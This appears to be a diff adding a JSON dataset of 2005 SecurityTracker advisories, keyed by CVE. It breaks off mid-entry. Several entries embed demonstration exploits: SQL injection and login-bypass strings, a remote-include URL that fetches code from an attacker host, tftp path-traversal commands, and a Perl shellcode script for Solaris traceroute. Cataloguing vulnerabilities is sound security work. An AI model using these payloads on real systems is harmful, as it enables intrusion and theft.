@@ -1,0 +1,1612 @@
+{
+  "year": 2005,
+  "total": 151,
+  "reference": "securitytracker.com",
+  "reports": {
+    "CVE-2005-0211": [
+      {
+        "url": "http://securitytracker.com/id?1013045",
+        "title": "Squid Buffer Overflow in WCCP recvfrom() Lets Remote Users Deny Service",
+        "body": "A vulnerability was reported in Squid in the WCCP recvfrom() call. A remote user can cause Squid to crash.The vendor reported that a remote user can send a specially crafted and larger than normal WCCP message to the target server to trigger a buffer overflow in recvfrom() and cause Squid to crash.The system is only vulnerable if configured to send WCCP messages to and receive WCCP messages from a router.The vendor credits the FSC Vulnerability Research Team with reporting this flaw.",
+        "extra": "A remote user can cause the target Squid server to crash.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-0413": [
+      {
+        "url": "http://securitytracker.com/id?1013136",
+        "title": "MyPHP Forum Input Validation Holes Let Remote Users Inject SQL Commands",
+        "body": "A vulnerability was reported in MyPHP Forum. A remote user can inject SQL commands.Several scripts do not properly validate user-supplied input in certain fields. A remote user can supply a specially crafted input to execute SQL commands on the underlying database. This flaw can be exploited if 'magic_quotes_gpc' is off.The 'forum.php' script does not properly validate user-supplied input in the 'fid' parameter.The 'member.php' script does not properly validate user-supplied input in the 'member' parameter. A demonstration exploit URL is provided:member.php?action=viewpro&member=nonexist' UNION SELECT uid, username, password, status, email, website, aim, msn, location, sig, regdate, posts, password as yahoo FROM nb_member WHERE uid='1The 'forgot.php' script does not properly validate user-supplied input in the 'email' parameter.The 'include.php' script does not properly validate user-supplied input in the 'nbuser' and 'nbpass' parameters.foster GHC reported these flaws.",
+        "extra": "A remote user can execute SQL commands on the underlying database.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-0504": [
+      {
+        "url": "http://securitytracker.com/id?1013273",
+        "title": "Linux Kernel Buffer Overflows in Moxa Char Driver Yield Root Privileges to Local Users",
+        "body": "Some buffer overflow vulnerabilities were reported in the Linux kernel in the moxa char driver. A local user can execute arbitrary code with root privileges.The driver does not properly validate the length of certain user-supplied inputs.The flaws reside in 'drivers/char/moxa.c' in the MoxaDriverIoctl(), moxaloadbios(), moxaloadcode(), and moxaload320b() functions.This vulnerability was reported in January 2005 by Brad Spengler of grsecurity.",
+        "extra": "A local user can execute arbitrary code with root privileges.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-0679": [
+      {
+        "url": "http://securitytracker.com/id?1013390",
+        "title": "Tell a Friend Script Lets Remote Users Include and Execute Arbitrary Code",
+        "body": "An include file vulnerability was reported in the STADTAUS.com 'Tell a Friend Script' software. A remote user can execute arbitrary commands on the target system.The 'inc/tell_a_friend.inc.php' component does not properly validate user-supplied input. A remote user can submit a specially crafted 'script_root' parameter to cause the target system to include and execute arbitrary PHP code from a remote web server. The arbitrary PHP code, including operating system commands, will run with the privileges of the target web service.Filip Groszynski reported this vulnerability.",
+        "extra": "A remote user can execute arbitrary PHP code and operating system commands on the target system with the privileges of the target web service.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-0748": [
+      {
+        "url": "http://securitytracker.com/id?1013409",
+        "title": "WEBinsta Website Mailing list manager Include File Flaw Lets Remote Users Execute Arbitrary Commands",
+        "body": "Fidel Costa from SpyKids Group reported an include file vulnerability in WEBinsta's Website Mailing list manager. A remote user can execute arbitrary commands on the target system.The 'inc/initdb.php' script does not properly validate user-supplied input in the 'absolute_path' parameter. A remote user can supply a specially crafted URL to cause the target system to include and execute arbitrary PHP code from a remote system. The PHP code, including operating system commands, will run with the privileges of the target web service.A demonstration exploit URL is provided:http://[target]/[mailing_dir]/inc/initdb.php?absolute_path=http://[attacker]/cmd?&",
+        "extra": "A remote user can execute arbitrary PHP code and operating system commands on the target system with the privileges of the target web service.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-0803": [
+      {
+        "url": "http://securitytracker.com/id?1015168",
+        "title": "Microsoft Windows Buffer Overflows in Graphics Rendering Engine Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Microsoft Windows in the Graphics Rendering Engine. A remote user can execute arbitrary code on the target system. A remote user can also cause denial of service conditions.The Windows Graphic Rendering Engine contains a buffer overflow in the rendering of Windows Metafile (WMF) and Enhanced Metafile (EMF) image formats [CVE-2005-2123]. A remote user can create a specially crafted file that, when processed by the target user, will execute arbitrary code on the target user's system. The code will run with System level privileges.A separate buffer overflow exists in the rendering of Windows Metafile (WMF) image formats [CVE-2005-2124]. Arbitrary code can be executed.A separate buffer overflow exists in the rendering of Enhanced Metafile (EMF) image formats [CVE-2005-0803]. A remote user can cause the target application to crash. This vulnerability is currently being exploited in the wild [at the time of this entry.]Images delivered via web sites or e-mail messages can exploit these vulnerabilities.The vendor credits eEye Digital Security for reporting the Metafile vulnerability and Venustech AdDLab, eEye Digital Security, and Peter Ferrie of Symantec Security Response with reporting the Windows Metafile vulnerability.",
+        "extra": "A remote user can execute arbitrary code on the target system.A remote user can cause the target user's browers (or other affected application) to crash.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-0844": [
+      {
+        "url": "http://securitytracker.com/id?1013512",
+        "title": "Nortel Contivity VPN Client Discloses Passwords to Local Users",
+        "body": "A vulnerability was reported in Nortel Contivity in the VPN client software. A local user can obtain the password.description00The VPN client software stores the VPN password in the Windows registry in encoded form and in process memory in clear-text form. A local user with access to the 'Extranet.exe' process memory can recover the user password and, if group authentication is used, the group password.Additional exploit details are available at:http://www.nta-monitor.com/news/vpn-flaws/nortel/nortel-client/The vendor has been notified.Roy Hills of NTA Monitor reported this vulnerability.",
+        "extra": "A local user can obtain the user password and the group password.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-0904": [
+      {
+        "url": "http://securitytracker.com/id?1013552",
+        "title": "Microsoft Windows Remote Desktop 'TSShutdn.exe' Lets Remote Authenticated Users Shutdown the System",
+        "body": "A vulnerability was reported in Microsoft Windows Remote Desktop. A remote authenticated user can shutdown the target system.The Remote Desktop does not check the 'Force shutdown from a remote system' user right. A remote user without administrative privileges can invoke the 'TSShutdn.exe' command to shutdown the remote system.Windows XP SP1 is affected.",
+        "extra": "A remote authenticated user can shutdown the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1017": [
+      {
+        "url": "http://securitytracker.com/id?1013617",
+        "title": "MaxWebPortal Input Validation Holes in 'events_functions' and 'links_add_form' Permit SQL Injection and Cross-Site Scripting Attacks",
+        "body": "Zinho of Hackers Center Security Group reported some input validation vulnerabilities in MaxWebPortal. A remote user can inject SQL commands and conduct cross-site scripting attacks.The EVENT_ID parameter in the Update_Events function in 'events_functions.asp' is not properly validated. A remote user can supply a specially crafted value to execute SQL commands on the underlying database. A remote user can, for example, modify the PORTAL_EVENTS table values.A demonstration exploit is available at:http://www.hackerscenter.com/archive/view.asp?id=1807The banner URL parameter in 'links_add_form.asp' is not properly validated. A remote user can submit a specially crafted value that, when viewed by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the MaxWebPortal software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "extra": "A remote user can execute SQL commands on the underlying database.A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the MaxWebPortal software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1020": [
+      {
+        "url": "http://www.securitytracker.com/alerts/2005/Apr/1013655.html",
+        "title": "Cisco IOS SSH Server TACACS Bugs Let Remote Users Deny Service",
+        "body": "A vulnerability was reported in the Cisco IOS Secure Shell Server in the TACACS implementation. A remote user can cause the target device to reload.A remote user can send a specially crafted packet to an IOS device running SSH version 2 to cause denial of service conditions in certain cases [Cisco Bug ID CSCed65778].If the device is configured to authenticate users via a TACACS+ server (e.g., \"aaa authentication login <group name> group tacacs+ local\") and the username includes a domain name, the vulnerability can be triggered.If a remote authenticated user issues the 'send' command while a new SSH session has been initiated but not yet authenticated, the vulnerability can be triggered.If an SSH session is terminated while the SSH server is sending data to the client and the server is configured to log messages via that session (via the terminal monitor command), the vulnerability can be triggered.A remote user can connect to the SSH port and supply an invalid username or password when the system is configured to authenticate against a TACACS+ server to trigger a memory leak [Cisco Bug ID CSCed65285]. Both SSH version 1 and version 2 are affected. The memory leak can cause the system to consume excessive memory resources and eventually reload.",
+        "extra": "A remote user can cause the target device to reload or to consume excessive resources.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1021": [
+      {
+        "url": "http://www.securitytracker.com/alerts/2005/Apr/1013655.html",
+        "title": "Cisco IOS SSH Server TACACS Bugs Let Remote Users Deny Service",
+        "body": "A vulnerability was reported in the Cisco IOS Secure Shell Server in the TACACS implementation. A remote user can cause the target device to reload.A remote user can send a specially crafted packet to an IOS device running SSH version 2 to cause denial of service conditions in certain cases [Cisco Bug ID CSCed65778].If the device is configured to authenticate users via a TACACS+ server (e.g., \"aaa authentication login <group name> group tacacs+ local\") and the username includes a domain name, the vulnerability can be triggered.If a remote authenticated user issues the 'send' command while a new SSH session has been initiated but not yet authenticated, the vulnerability can be triggered.If an SSH session is terminated while the SSH server is sending data to the client and the server is configured to log messages via that session (via the terminal monitor command), the vulnerability can be triggered.A remote user can connect to the SSH port and supply an invalid username or password when the system is configured to authenticate against a TACACS+ server to trigger a memory leak [Cisco Bug ID CSCed65285]. Both SSH version 1 and version 2 are affected. The memory leak can cause the system to consume excessive memory resources and eventually reload.",
+        "extra": "A remote user can cause the target device to reload or to consume excessive resources.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1425": [
+      {
+        "url": "http://securitytracker.com/id?1013830",
+        "title": "Uapplication Products Disclose the Database to Remote Users and Let Remote Authenticate Administrators Upload Arbitrary Files",
+        "body": "Team-evil MOroccain Hackers reported a vulnerability in several Uapplication products. A remote user can obtain the database, which includes the administrative password.A remote user can supply the following type of URLs to obtain the underlying database files:http://[target]/uguestbook/mdb-databse/guestbook.mdbhttp://[target]/ublog/mdb-database/blog.msbhttp://[target]/uphotogallery/mdb-database/uphotogallery.mdbThe database contains the administrative password.A remote authenticated administrator can invoke the uphotogallery 'edit_image.asp' script to upload arbitrary files to the target system.Team-evil MOroccain Hackers reported this vulnerability.",
+        "extra": "A remote user can obtain the database, which includes the administrator's password.A remote authenticated administrator can upload arbitrary files to the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1426": [
+      {
+        "url": "http://securitytracker.com/id?1013830",
+        "title": "Uapplication Products Disclose the Database to Remote Users and Let Remote Authenticate Administrators Upload Arbitrary Files",
+        "body": "Team-evil MOroccain Hackers reported a vulnerability in several Uapplication products. A remote user can obtain the database, which includes the administrative password.A remote user can supply the following type of URLs to obtain the underlying database files:http://[target]/uguestbook/mdb-databse/guestbook.mdbhttp://[target]/ublog/mdb-database/blog.msbhttp://[target]/uphotogallery/mdb-database/uphotogallery.mdbThe database contains the administrative password.A remote authenticated administrator can invoke the uphotogallery 'edit_image.asp' script to upload arbitrary files to the target system.Team-evil MOroccain Hackers reported this vulnerability.",
+        "extra": "A remote user can obtain the database, which includes the administrator's password.A remote authenticated administrator can upload arbitrary files to the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1532": [
+      {
+        "url": "http://securitytracker.com/id?1013965",
+        "title": "Firefox Lets Remote Users Invoke eval and Script Objects With Elevated Privileges",
+        "body": "A vulnerability was reported in the Firefox web browser. A remote user can cause scripting code to be executed with elevated privileges.A remote user can create HTML that can cause privileged code to invoke eval() or Script() objects with user-supplied data. Scripts in the HTML can override properties and methods of non-DOM nodes.No further details were provided.The vendor credits moz_bug_r_a4 with reporting this vulnerability.",
+        "extra": "A remote user can execute arbitrary scripting code with elevated privileges.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1013964",
+        "title": "Mozilla Suite Lets Remote Users Invoke eval and Script Objects With Elevated Privileges",
+        "body": "A vulnerability was reported in the Mozilla web browser suite. A remote user can cause scripting code to be executed with elevated privileges.A remote user can create HTML that can cause privileged code to invoke eval() or Script() objects with user-supplied data. Scripts in the HTML can override properties and methods of non-DOM nodes.No further details were provided.The vendor credits moz_bug_r_a4 with reporting this vulnerability.",
+        "extra": "A remote user can execute arbitrary scripting code with elevated privileges.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1689": [
+      {
+        "url": "http://securitytracker.com/id?1014461",
+        "title": "Kerberos krb5_recvauth() Double-Free Error May Let Remote Users Execute Arbitrary Code",
+        "body": "A double-free memory vulnerability was reported in Kerberos in the krb5_recvauth() function. A remote user may be able to execute arbitrary code.A remote user can create certain error conditions to cause the krb5_recvauth() function to free memory that has been previously freed. Arbitrary code may be executed.If the target system is a Kerberos Key Distribution Center (KDC) host, then the entire Kerberos realm may be compromised.The 'kpropd', 'klogind', and 'krshd' applications are affected.The vulnerability resides in 'krb/recvauth.c'.The vendor credits Magnus Hagander with reporting this vulnerability.",
+        "extra": "A remote user may be able to execute arbitrary code.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1704": [
+      {
+        "url": "http://securitytracker.com/id?1016544",
+        "title": "GNU Project Debugger (GDB) Integer Overflow in Binary File Descriptor Library May Permit Code Execution",
+        "body": "A vulnerability was reported in GNU Project Debugger (GDB). A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted object file with a large number of section headers that, when loaded by the target user, will trigger an integer overflow in the Binary File Descriptor (BFD) library and execute arbitrary code on the target system.Several packages, including binutils and elfutils use the affected library.This vulnerability was originally reported in May 2005.",
+        "extra": "A remote user can create a file that, when loaded by the target user, will execute arbitrary code on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1761": [
+      {
+        "url": "http://securitytracker.com/id?1014275",
+        "title": "Linux Kernel IA64 Architecture restore_sigcontext() Access Control Bug May Let Local Users Gain Elevated Privileges",
+        "body": "A vulnerability was reported in the Linux kernel. A local user may be able to gain elevated privileges.An access control error in the restore_sigcontext() function allows a local user to invoke ptrace to access the AR.RSC register.IA64-based architectures are affected.",
+        "extra": "[Editor's note: The impact was not specifically identified but is appears to allow privilege escalation.]",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1787": [
+      {
+        "url": "http://securitytracker.com/id?1014064",
+        "title": "phpStat 'setup.php' Lets Remote Users Modify the Administrative Password",
+        "body": "SoulBlack Security Research reported a vulnerability in phpStat. A remote user can gain administrative access to the application.A remote user can supply a specially crafted URL to cause 'setup.php' to reset the password on a username. Then, the remote user can login using the specified password.A demonstration exploit URL is provided:setup.php?check=yes&username=admin&password=adminA demonstration exploit is available at:http://www.soulblack.com.ar/repo/tools/sbphpstatpoc.txtThe original advisory is available at:http://www.soulblack.com.ar/repo/papers/advisory/PhpStat_advisory.txt",
+        "extra": "A remote user can change the administrative password and access the application.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1790": [
+      {
+        "url": "http://securitytracker.com/id?1015251",
+        "title": "Microsoft Internet Explorer Bug in Processing Mismatched Document Object Model Objects May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Microsoft Internet Explorer. A remote user may be able to cause arbitrary code to be executed on the target user's system.A remote user can create specially crafted HTML that, when loaded by the target user, will cause arbitrary code to be executed on the target system. The code will run with the privileges of the target user.HTML that contains certain javascript onload() events can trigger the flaw. The vulnerability occurs due to way that Internet Explorer handles mismatched Document Object Model (DOM) objects. Other events may be affected.Exploit code is publicly available and malicious software is actively exploiting this vulnerability.This vulnerability was originally reported by Benjamin Tobias Franz in May 2005 as a denial of service vulnerability. In that report, the following demonstration exploit was provided:<body onLoad=\"window()\">",
+        "extra": "A remote user can create HTML that, when loaded by the target user, will cause arbitrary code to be executed on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1795": [
+      {
+        "url": "http://securitytracker.com/id?1014070",
+        "title": "Clam AntiVirus on Mac OS Lets Local Users Gain Elevated Privileges",
+        "body": "A vulnerability was reported in Clam AntiVirus. A local user can gain elevated privileges on Mac OS systems.A local user can create a file containing a virus and having a specially crafted filename that, when processed by ClamAV, will execute arbitrary operating system commands. The commands will run with the privileges of the ClamAV process.Only systems runnign the Mac OS file system (HFS) are affected.The flaw resides in the filecopy() function in 'shared/misc.c' and is triggered when the ClamAV user account does not have permissions to remove the infected file and file quarantine is enabled. In this case, the software will invoke a system() call with the filename as a parameter.The vendor was notified on April 3, 2005.Kevin Amorin and Timothy Morgan discovered this vulnerability.The original advisory is available at:http://www.sentinelchicken.com/advisories/clamav/",
+        "extra": "A local user can execute arbitrary operating system commands with the privileges of the ClamAV process.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1812": [
+      {
+        "url": "http://securitytracker.com/id?1014079",
+        "title": "FutureSoft TFTP Server 2000 Buffer Overflow Lets Remote Users Execute Arbitrary Code and Input Validation Hole Discloses Files to Remote Users",
+        "body": "A vulnerability was reported in FutureSoft TFTP Server 2000. A remote user can view arbitrary files on the target system. A remote user can also execute arbitrary code on the target system.A remote user can send a TFTP Read Request (RRQ) or Write Request (WRQ) packet with a specially crafted filename or transfer-mode string to trigger a buffer overflow and overwrite the SEH and EIP registers. Arbitrary code can be executed with Local System privileges.A remote user can send a GET request with a specially crafted filename containing directory traversal characters to view files on the target system that are located outside of the TFTP directory.Some demonstration exploit commands are provided:tftp -i [target] GET ../../../../../boot.initftp -i [target] GET ..\\..\\..\\..\\..\\boot.iniThe vendor was notified on May 18, 2005, without response.Tan Chew Keong of SIG^2 Vulnerability Research reported this vulnerability.",
+        "extra": "A remote user can execute arbitrary code on the target system with Local System privileges.A remote user can view files on the target system that are located outside of the TFTP directory.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1813": [
+      {
+        "url": "http://securitytracker.com/id?1014079",
+        "title": "FutureSoft TFTP Server 2000 Buffer Overflow Lets Remote Users Execute Arbitrary Code and Input Validation Hole Discloses Files to Remote Users",
+        "body": "A vulnerability was reported in FutureSoft TFTP Server 2000. A remote user can view arbitrary files on the target system. A remote user can also execute arbitrary code on the target system.A remote user can send a TFTP Read Request (RRQ) or Write Request (WRQ) packet with a specially crafted filename or transfer-mode string to trigger a buffer overflow and overwrite the SEH and EIP registers. Arbitrary code can be executed with Local System privileges.A remote user can send a GET request with a specially crafted filename containing directory traversal characters to view files on the target system that are located outside of the TFTP directory.Some demonstration exploit commands are provided:tftp -i [target] GET ../../../../../boot.initftp -i [target] GET ..\\..\\..\\..\\..\\boot.iniThe vendor was notified on May 18, 2005, without response.Tan Chew Keong of SIG^2 Vulnerability Research reported this vulnerability.",
+        "extra": "A remote user can execute arbitrary code on the target system with Local System privileges.A remote user can view files on the target system that are located outside of the TFTP directory.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1918": [
+      {
+        "url": "http://securitytracker.com/id?1015655",
+        "title": "Tar on Red Hat Enterprise Linux Lets Remote Users Write Files",
+        "body": "A vulnerability was reported in Tar on Red Hat Enterprise Linux. A remote user can cause files to be written to the target user's system.The Red Hat backported security patch for an older vulnerability (CVE-2002-0399) did not properly correct the original vulnerability.The original vulnerability was a path traversal flaw in the extraction of GNU tar archives. A remote user can create a specially crafted archive that, when extracted by the target user, will write arbitrary files with the privileges of the target user.",
+        "extra": "A remote user may be able to cause files to be written to the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1925": [
+      {
+        "url": "http://securitytracker.com/id?1015190",
+        "title": "TikiWiki Input Validation Holes in 'user_preferences.php' and 'editpage.php' Let Remote Users Execute Arbitrary Code",
+        "body": "Two vulnerabilities were reported in TikiWiki. A remote user can execute arbitrary code on the target system.The 'tiki-user_preferences.php' script does not properly validate user-supplied input in the 'language' parameter. Also, the 'tiki-editpage.php' script does not properly validate user-supplied input in the 'suck_url' parameter. A remote user can supply a specially crafted parameter value containing directory traversal characters to cause arbitrary files to be included (and displayed) by the target server.A remote user can exploit this to execute arbitrary code by submitting a specially crafted request containing PHP code. The request will be logged by the system. The remote user can then cause the log file to be included, thereby causing the PHP code to be executed.The vendor was notified on June 7, 2005.iDEFENSE reported these vulnerabilities.The original advisories are available at:http://www.idefense.com/application/poi/display?id=335&type=vulnerabilitieshttp://www.idefense.com/application/poi/display?id=337&type=vulnerabilities",
+        "extra": "A remote user can execute arbitrary code on the target system with the privileges of the target web service.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1928": [
+      {
+        "url": "http://securitytracker.com/id?1015358",
+        "title": "Trend Micro ServerProtect Buffer Overflows and Other Bugs Permit Remote Code Execution, Denial of Service, and File Disclosure",
+        "body": "iDEFENSE reported several vulnerabilities in Trend Micro ServerProtect. A remote user can execute arbitrary code on the target system. A remote user can view files on the target system. A remote user can cause denial of service conditions.The 'rptserver.asp' script does not properly validate user-supplied input in the IMAGE parameter [CVE-2005-1930]. A remote user can supply a specially crafted parameter value containing directory traversal characters to view the contents of arbitrary files on the target system.The 'isaNVWRequest.dll' and 'relay.dll' components contain a buffer overflow [CVE-2005-1929]. A remote user can supply a specially crafted HTTP POST request to trigger a heap overflow and execute arbitrary code on the target system.A remote user can send specially crafted packets containing the string \"\\x21\\x43\\x65\\x87\" to port 5005 on the EarthAgent to trigger a memory leak [CVE-2005-1928]. This can cause the system to consume all available CPU resources. A remote user can repeatedly send these packets to cause the target service to consume all available memory on the target system.The vendor was notified on June 3, 2005.The original advisories are available at:http://www.idefense.com/application/poi/display?id=352&type=vulnerabilitieshttp://www.idefense.com/application/poi/display?id=353&type=vulnerabilitieshttp://www.idefense.com/application/poi/display?id=354&type=vulnerabilitieshttp://www.idefense.com/application/poi/display?id=356&type=vulnerabilities",
+        "extra": "A remote user can execute arbitrary code on the target system.A remote user can cause denial of service conditions on the target system.A remote user can view files on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-1929": [
+      {
+        "url": "http://securitytracker.com/id?1015358",
+        "title": "Trend Micro ServerProtect Buffer Overflows and Other Bugs Permit Remote Code Execution, Denial of Service, and File Disclosure",
+        "body": "iDEFENSE reported several vulnerabilities in Trend Micro ServerProtect. A remote user can execute arbitrary code on the target system. A remote user can view files on the target system. A remote user can cause denial of service conditions.The 'rptserver.asp' script does not properly validate user-supplied input in the IMAGE parameter [CVE-2005-1930]. A remote user can supply a specially crafted parameter value containing directory traversal characters to view the contents of arbitrary files on the target system.The 'isaNVWRequest.dll' and 'relay.dll' components contain a buffer overflow [CVE-2005-1929]. A remote user can supply a specially crafted HTTP POST request to trigger a heap overflow and execute arbitrary code on the target system.A remote user can send specially crafted packets containing the string \"\\x21\\x43\\x65\\x87\" to port 5005 on the EarthAgent to trigger a memory leak [CVE-2005-1928]. This can cause the system to consume all available CPU resources. A remote user can repeatedly send these packets to cause the target service to consume all available memory on the target system.The vendor was notified on June 3, 2005.The original advisories are available at:http://www.idefense.com/application/poi/display?id=352&type=vulnerabilitieshttp://www.idefense.com/application/poi/display?id=353&type=vulnerabilitieshttp://www.idefense.com/application/poi/display?id=354&type=vulnerabilitieshttp://www.idefense.com/application/poi/display?id=356&type=vulnerabilities",
+        "extra": "A remote user can execute arbitrary code on the target system.A remote user can cause denial of service conditions on the target system.A remote user can view files on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2035": [
+      {
+        "url": "http://securitytracker.com/id?1014221",
+        "title": "CoolCafe 'login.asp' Input Validation Hole Permits SQL Injection",
+        "body": "A vulnerability was reported in CoolCafe. A remote user can inject SQL commands.The 'login.asp' script does not properly validate user-supplied input. A remote user can supply a specially crafted parameter value to execute SQL commands on the underlying database. A remote user can exploit this to obtain passwords from the system.Some demonstration exploit values for 'coolcafe/login.asp' are provided:user: adminpassword: 'or'Donnie Werner of exploitlabs discovered this vulnerability.The original advisory is available at:http://exploitlabs.com/files/advisories/EXPL-A-2005-009-coolcafe.txt",
+        "extra": "A remote user can execute SQL commands on the underlying database.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2071": [
+      {
+        "url": "http://securitytracker.com/id?1015261",
+        "title": "Sun Solaris traceroute(1M) Buffer Overflow in Processing '-g' Parameters Lets Local Users Gain Elevated Privileges",
+        "body": "A vulnerability was reported in traceroute on Sun Solaris. A local user may be able to gain elevated privileges.A local user can trigger a buffer overflow in traceroute(1M) in the processing of the '-g' command line argument parameters to execute arbitrary code. The code can run with PRIV_NET_RAWACCESS privileges, allowing network layer access.Solaris 8 and Solaris 9 are not affected.Przemyslaw Frasunek reported this vulnerability in June 2005.Some demonstration exploit code is provided:#!/usr/bin/perl$ret = 0x8046bb0; # heap, solaris on amd64$shellcode = \"A\" x 5000 .\"\\xb8\\xff\\xf8\\xff\\x3c\\xf7\\xd0\\x50\\x31\\xc0\\xb0\\x9a\\x50\\x89\\xe5\\x31\\xc0\\x50\\x68\\x2f\\x2f\\ \\x73\\x68\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe2\\x50\\x52\\x53\\xb0\\x3b\\xff\\xd5\";$ip = sprintf(\"%d.%d.%d.%d\", $ret & 0xff, ($ret & 0xff00) >> 8, ($ret &0xff0000) >> 16, ($ret & 0xff000000) >> 24);$cmd = \"/usr/sbin/traceroute -g '$shellcode' -g 2 -g 3 -g 4 -g 5 -g 6 -g 7 -g 8-g 9 -g 10 $ip\";print $cmd, \"\\n\";system($cmd);",
+        "extra": "A local user can obtain PRIV_NET_RAWACCESS privileges.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2072": [
+      {
+        "url": "http://securitytracker.com/id?1014537",
+        "title": "(Sun Issues Fix) Sun Solaris 'ld.so' LD_AUDIT Validation Error Lets Local Users Gain Elevated Privileges",
+        "body": "A vulnerability was reported in Sun Solaris in 'ld.so'. A local user may be able to gain elevated privileges.The 'ld.so' loader does not properly validate user-supplied input in the LD_AUDIT environment variable when executing binaries with elevated privileges. A local user can create arbitrary code and set the environment variable to point to the arbitrary code (as a dynamic library). Then, when a set user id (setuid) or set group id (setgid) binary is invoked, the arbitrary code may be executed with elevated privileges.Przemyslaw Frasunek reported this vulnerability.",
+        "extra": "A local user may be able to execute arbitrary code with elevated privileges.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2087": [
+      {
+        "url": "http://securitytracker.com/id?1014329",
+        "title": "Microsoft Internet Explorer 'javaprxy.dll' COM Object Exception Handling Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Microsoft Internet Explorer in 'javaprxy.dll'. A remote user can cause the target user's browser to crash or execute arbitrary code.A remote user can create specially crafted HTML that, when loaded by the target user, will trigger a heap overflow in 'javaprxy.dll' and cause the target user's browser to crash. Specially crafted object tags can cause certain COM componenets to crash.It is also possible to overwrite a function pointer to execute arbitrary code.A demonstration exploit from FrSIRT is available at:http://www.frsirt.com/exploits/20050702.iejavaprxyexploit.pl.phpThe vendor was notified on June 17, 2005.sk0L and Martin Eiszner from SEC-CONSULT discovered this vulnerability.",
+        "extra": "A remote user can cause the target user's browser to crash.A remote user can execute arbitrary code on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2099": [
+      {
+        "url": "http://securitytracker.com/id?1014644",
+        "title": "Linux Kernel Keyring Destruction Error Lets Local Users Deny Service",
+        "body": "A vulnerability was reported in the Linux kernel in the processing of keyrings. A local user may be able to cause the system to crash.A local user can attempt to add a keyring in a manner that will cause the keyring instantiation function to fail. The system will then attempt to remove the keyring from the name list, causing the system to crash.",
+        "extra": "A local user can cause the target system to crash.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2127": [
+      {
+        "url": "http://securitytracker.com/id?1014727",
+        "title": "Microsoft 'msdds.dll' COM Object Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in the Microsoft 'msdds.dll' ActiveX object. The flaw can be exploited via Internet Explorer. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create specially crafted HTML that, when loaded by the target user with Internet Explorer, will trigger a vulnerability in the 'msdds.dll' COM object (CLSID: EC444CB6-3E7E-4865-B1C3-0DE72EF39B3F). Arbitrary code can be executed with the privileges of the target user.The affected COM Object component is the Microsoft DDS Library Shape Control used by various components such as Visual Studio Database Diagramming. The vulnerable versions of 'Msdds.dll' are 7.0.9064.9112, 7.0.9064.9143, and 7.0.9466.0. Versions 7.0.9955.0 and 7.10.3077.0 and higher versions are not affected.Microsoft indicates that users of the initial release of Microsoft Visual Studio 2002 are affected.Users of Microsoft Office XP SP3 are not vulnerable by default. However, if the 'Msvcr70.dll' and 'Msvscp70.dll' files are accessible to Internet Explorer process (by being in the same directory as 'Msdds.dll' or being in the path, for example), then the system is vulnerable.'Anonymous' discovered this vulnerability.",
+        "extra": "A remote user can cause arbitrary code to be executed on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2177": [
+      {
+        "url": "http://securitytracker.com/id?1017273",
